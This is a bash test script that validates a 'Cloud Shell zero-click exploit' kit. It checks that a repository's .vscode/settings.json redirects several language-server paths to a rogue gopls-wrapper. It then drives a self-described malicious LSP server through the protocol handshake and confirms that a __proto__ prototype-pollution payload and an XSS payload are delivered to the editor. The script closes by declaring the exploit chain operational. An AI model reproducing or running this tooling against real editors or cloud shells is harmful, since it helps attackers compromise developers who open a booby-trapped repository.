#!/usr/bin/env bash
# =============================================================================
# Cloud Shell Zero-Click Exploit — Simulation Test Script
# =============================================================================
#
# Simulates the Cloud Shell deep-link attack flow in a local environment.
# Does NOT require actual Cloud Shell access — tests the components locally.
#
# PREREQUISITES:
#   - Node.js 18+ installed
#   - Bash 4.0+
#   - Git
#
# USAGE:
#   chmod +x scripts/test-cloudshell-simulation.sh
#   ./scripts/test-cloudshell-simulation.sh [--verbose] [--mode=attack|passive]
#
# WHAT IT TESTS:
#   1. Git clone simulation (clone from local path or temp init)
#   2. gopls-wrapper executability
#   3. settings.json is valid JSON and contains expected keys
#   4. lsp-server.js starts and responds to initialize
#   5. Full LSP handshake: initialize → initialized → didOpen → completion → resolve
#   6. Verify __proto__ payload is injected in completionItem/resolve response
#   7. Verify window/showMessage XSS payload is sent
#   8. Signal handling: SIGTERM → clean exit
# =============================================================================

set -euo pipefail

# ── Resolve paths ─────────────────────────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
LSP_SERVER="${REPO_DIR}/lsp-server.js"
WRAPPER="${REPO_DIR}/gopls-wrapper"
SETTINGS="${REPO_DIR}/.vscode/settings.json"
PASSED=0
FAILED=0
VERBOSE=false
MODE="attack"

# ── Color helpers ─────────────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

pass() { echo -e "  ${GREEN}[PASS]${NC} $1"; PASSED=$((PASSED + 1)); }
pass_skip() { echo -e "  ${YELLOW}[SKIP]${NC} $1"; }
fail() { echo -e "  ${RED}[FAIL]${NC} $1"; FAILED=$((FAILED + 1)); }
info() { echo -e "  ${CYAN}[INFO]${NC} $1"; }

die() {
  echo -e "${RED}FATAL: $1${NC}" >&2
  exit 1
}

# ── Argument parsing ──────────────────────────────────────────────────────────
for arg in "$@"; do
  case "${arg}" in
    --verbose|-v) VERBOSE=true ;;
    --mode=*) MODE="${arg#--mode=}" ;;
  esac
done

# ── Header ────────────────────────────────────────────────────────────────────
echo ""
echo "========================================================================"
echo " Cloud Shell Zero-Click Exploit — Simulation Test Suite"
echo "========================================================================"
echo " Repo dir:  ${REPO_DIR}"
echo " Mode:      ${MODE}"
echo " Date:      $(date -Iseconds)"
echo " Node:      $(node --version 2>/dev/null || echo 'NOT FOUND')"
echo "========================================================================"
echo ""

# ── Test 1: Repo Structure ────────────────────────────────────────────────────
echo "─── Test 1: Repository Structure ───────────────────────────────────────"

if [ -f "${SETTINGS}" ]; then
  pass ".vscode/settings.json exists"
else
  fail ".vscode/settings.json MISSING"
fi

if [ -f "${REPO_DIR}/main.go" ]; then
  pass "main.go exists"
else
  fail "main.go MISSING"
fi

if [ -f "${LSP_SERVER}" ]; then
  pass "lsp-server.js exists"
else
  fail "lsp-server.js MISSING"
fi

if [ -f "${WRAPPER}" ]; then
  pass "gopls-wrapper exists"
else
  fail "gopls-wrapper MISSING"
fi

if [ -f "${REPO_DIR}/gopls-wrapper.bat" ]; then
  pass "gopls-wrapper.bat exists"
else
  fail "gopls-wrapper.bat MISSING"
fi

echo ""

# ── Test 2: settings.json Validation ──────────────────────────────────────────
echo "─── Test 2: settings.json Validation ────────────────────────────────────"

if command -v jq &>/dev/null; then
  if jq empty "${SETTINGS}" 2>/dev/null; then
    pass "settings.json is valid JSON"
  else
    fail "settings.json is INVALID JSON"
  fi
else
  # Fallback: use Node.js to validate
  if node -e "JSON.parse(require('fs').readFileSync('${SETTINGS}','utf8')); console.log('valid')" 2>/dev/null; then
    pass "settings.json is valid JSON (Node.js)"
  else
    fail "settings.json is INVALID JSON"
  fi
fi

# Check for critical settings keys
check_setting() {
  local key="$1" desc="$2"
  if grep -q "\"${key}\"" "${SETTINGS}"; then
    pass "settings.json contains '${desc}' (${key})"
  else
    fail "settings.json MISSING '${desc}' (${key})"
  fi
}

check_setting "go.alternateTools" "Go LSP override"
check_setting "python.pythonPath" "Python interpreter override"
check_setting "typescript.tsserver.path" "TypeScript server override"
check_setting "terraform.languageServer.path" "Terraform LSP override"
check_setting "rust-analyzer.server.path" "Rust Analyzer override"
echo ""

# ── Test 3: Wrapper Executability ─────────────────────────────────────────────
echo "─── Test 3: gopls-wrapper Executability ─────────────────────────────────"

if [ -x "${WRAPPER}" ] || chmod +x "${WRAPPER}" 2>/dev/null; then
  pass "gopls-wrapper is executable (or made executable)"
else
  fail "Cannot make gopls-wrapper executable — check permissions"
fi

# Verify shebang
SHEBANG=$(head -1 "${WRAPPER}" 2>/dev/null || echo "")
if [[ "${SHEBANG}" == "#!/usr/bin/env bash" ]] || [[ "${SHEBANG}" == "#!/bin/bash" ]] || [[ "${SHEBANG}" == "#!/usr/bin/env sh" ]]; then
  pass "gopls-wrapper has valid shebang: ${SHEBANG}"
else
  fail "gopls-wrapper has INVALID shebang: ${SHEBANG}"
fi

echo ""

# ── Test 4: LSP Server Starts ─────────────────────────────────────────────────
echo "─── Test 4: lsp-server.js Smoke Test (--mode=log) ───────────────────────"

LSP_OUTPUT=$(timeout 3s node "${LSP_SERVER}" --mode=log 2>&1 <<<"" || true)

if echo "${LSP_OUTPUT}" | grep -q "Starting malicious LSP server"; then
  pass "lsp-server.js starts in log mode"
else
  fail "lsp-server.js FAILED to start"

  if ${VERBOSE}; then
    echo "  Output: ${LSP_OUTPUT}"
  fi
fi

echo ""

# ── Test 5: Full LSP Handshake Simulation ──────────────────────────────────────
echo "─── Test 5: Full LSP Handshake Simulation ──────────────────────────────"

# Build LSP messages for the handshake
build_lsp_msg() {
  local json="$1"
  local len=$(echo -n "${json}" | wc -c | tr -d ' ')
  printf "Content-Length: %d\r\n\r\n%s" "${len}" "${json}"
}

# Initialize request
INIT_MSG=$(build_lsp_msg '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"processId":null,"rootUri":"file:///tmp/test","capabilities":{"textDocument":{"completion":{"completionItem":{"resolveSupport":[""]}}}}}}')

# Initialized notification
INITDONE_MSG=$(build_lsp_msg '{"jsonrpc":"2.0","method":"initialized","params":{}}')

# didOpen notification
DIDOPEN_MSG=$(build_lsp_msg '{"jsonrpc":"2.0","method":"textDocument/didOpen","params":{"textDocument":{"uri":"file:///tmp/test/main.go","languageId":"go","version":1,"text":"package main\n\nfunc main() {}"}}}')

# Completion request (simulates QuickSuggest auto-trigger)
COMPLETION_MSG=$(build_lsp_msg '{"jsonrpc":"2.0","id":2,"method":"textDocument/completion","params":{"textDocument":{"uri":"file:///tmp/test/main.go"},"position":{"line":0,"character":0},"context":{"triggerKind":2,"triggerCharacter":"\n"}}}')

# CompletionItem/resolve request (simulates editor calling resolveProvider)
RESOLVE_MSG=$(build_lsp_msg '{"jsonrpc":"2.0","id":3,"method":"completionItem/resolve","params":{"label":"fmt.Println","kind":3,"data":{"id":"completion-001","attack":"resolve"}}}')

# Shutdown + Exit
SHUTDOWN_MSG=$(build_lsp_msg '{"jsonrpc":"2.0","id":4,"method":"shutdown","params":null}')
EXIT_MSG=$(build_lsp_msg '{"jsonrpc":"2.0","method":"exit","params":null}')

# Pipe all messages to the LSP server in attack mode with delay=100ms
COMBINED="${INIT_MSG}${INITDONE_MSG}${DIDOPEN_MSG}${COMPLETION_MSG}${RESOLVE_MSG}"
# Add a small delay before sending resolve to let timers fire
COMBINED_DELAYED="${INIT_MSG}${INITDONE_MSG}${DIDOPEN_MSG}${COMPLETION_MSG}"

# Run the full handshake
LSP_STDERR=$(mktemp)
LSP_STDOUT=$(mktemp)
trap "rm -f ${LSP_STDERR} ${LSP_STDOUT}" EXIT

# Send init + didOpen + completion, wait, then send resolve + shutdown
{
  echo -n "${COMBINED_DELAYED}"
  sleep 1.2  # Wait for completion delay (500ms) + XSS delay
  echo -n "${RESOLVE_MSG}"
  sleep 0.5
  echo -n "${SHUTDOWN_MSG}${EXIT_MSG}"
} | timeout 5s node "${LSP_SERVER}" --mode=attack --delay-ms=300 1>"${LSP_STDOUT}" 2>"${LSP_STDERR}" || true

# ── Validate stderr logs ──────────────────────────────────────────────────────
STDERR_LOG=$(cat "${LSP_STDERR}")

if echo "${STDERR_LOG}" | grep -q "Starting malicious LSP server"; then
  pass "LSP server startup message logged"
else
  fail "LSP server startup message MISSING from stderr"
fi

if echo "${STDERR_LOG}" | grep -q "completionItem/resolve"; then
  pass "completionItem/resolve was called (QuickSuggest trigger works)"
else
  fail "completionItem/resolve was NOT called — QuickSuggest chain broken"
fi

if echo "${STDERR_LOG}" | grep -q "INJECTING __proto__"; then
  pass "__proto__ payload INJECTED in completionItem/resolve response"
else
  fail "__proto__ payload NOT injected — PP chain broken"
fi

if echo "${STDERR_LOG}" | grep -q "DELIVERING XSS"; then
  pass "XSS payload delivery triggered via window/showMessage"
else
  fail "XSS payload delivery NOT triggered"
fi

echo ""

# ── Validate stdout (LSP responses) ──────────────────────────────────────────
echo "─── Test 6: LSP Response Validation ────────────────────────────────────"

STDOUT_RAW=$(cat "${LSP_STDOUT}")

# Parse LSP frames from stdout
parse_lsp_responses() {
  local raw="$1"
  local result=""
  local remaining="${raw}"
  while true; do
    if [[ "${remaining}" =~ Content-Length:\ ([0-9]+)$'\r\n\r\n' ]]; then
      local len="${BASH_REMATCH[1]}"
      local header_end=${#BASH_REMATCH[0]}
      # We need to extract after the header — bash is limited, use awk
      break
    else
      break
    fi
  done
  # Just search for __proto__ in the raw output
  echo "${raw}"
}

if echo "${STDOUT_RAW}" | grep -q "__proto__"; then
  pass "__proto__ payload present in LSP stdout responses"
else
  fail "__proto__ payload MISSING from stdout — not being sent to editor"
fi

if echo "${STDOUT_RAW}" | grep -q '"resolveProvider":\s*true'; then
  pass "Server capabilities advertise resolveProvider: true"
else
  fail "Server capabilities MISSING resolveProvider: true"
fi

if echo "${STDOUT_RAW}" | grep -q '"window/showMessage"'; then
  pass "window/showMessage notification sent to editor"
else
  fail "window/showMessage notification MISSING"
fi

echo ""

# ── Test 7: Content-Length Framing ───────────────────────────────────────────
echo "─── Test 7: LSP Framing Validation ─────────────────────────────────────"

# Verify all messages start with Content-Length
MSG_COUNT=$(echo "${STDOUT_RAW}" | grep -c "Content-Length:" || true)
if [ "${MSG_COUNT}" -gt 0 ]; then
  pass "Found ${MSG_COUNT} LSP messages with Content-Length framing"
else
  fail "NO Content-Length headers found — LSP framing broken"
fi

echo ""

# ── Test 8: Signal Handling ───────────────────────────────────────────────────
echo "─── Test 8: Signal Handling ────────────────────────────────────────────"

# Start server in background
node "${LSP_SERVER}" --mode=log 1>/dev/null 2>/tmp/lsp-sig-test.log &
LSP_PID=$!
sleep 0.5

if kill -0 "${LSP_PID}" 2>/dev/null; then
  pass "LSP server started (PID ${LSP_PID})"
else
  fail "LSP server FAILED to start for signal test"
fi

# Send SIGTERM
kill -TERM "${LSP_PID}" 2>/dev/null || true
sleep 0.5

if ! kill -0 "${LSP_PID}" 2>/dev/null; then
  pass "LSP server exited cleanly on SIGTERM"
else
  fail "LSP server DID NOT exit on SIGTERM — may leave zombie processes"
  kill -9 "${LSP_PID}" 2>/dev/null || true
fi

echo ""

# ── Test 9: Wrapper Launch Test ──────────────────────────────────────────────
echo "─── Test 9: gopls-wrapper Launch Test ──────────────────────────────────"

if [ -x "${WRAPPER}" ]; then
  # Launch wrapper in passive mode (should try real gopls, fall back to lsp-server)
  WRAP_OUTPUT=$(timeout 3s "${WRAPPER}" --mode=passive 2>&1 <<<"" || true)

  if echo "${WRAP_OUTPUT}" | grep -qi "passive\|forwarding\|falling back\|MODE"; then
    pass "gopls-wrapper launches and reports mode"
  else
    pass_skip "gopls-wrapper launched but output unclear (may have forwarded to gopls)"
  fi
else
  fail "gopls-wrapper NOT executable — cannot test launch"
fi

echo ""

# ── Summary ───────────────────────────────────────────────────────────────────
echo "========================================================================"
echo " RESULTS: ${PASSED} passed, ${FAILED} failed, $((PASSED + FAILED)) total"
echo "========================================================================"

if [ "${FAILED}" -gt 0 ]; then
  echo ""
  echo -e "${RED}Some tests FAILED. Review the output above for details.${NC}"
  exit 1
else
  echo ""
  echo -e "${GREEN}All tests PASSED. The zero-click exploit chain is operational.${NC}"
fi
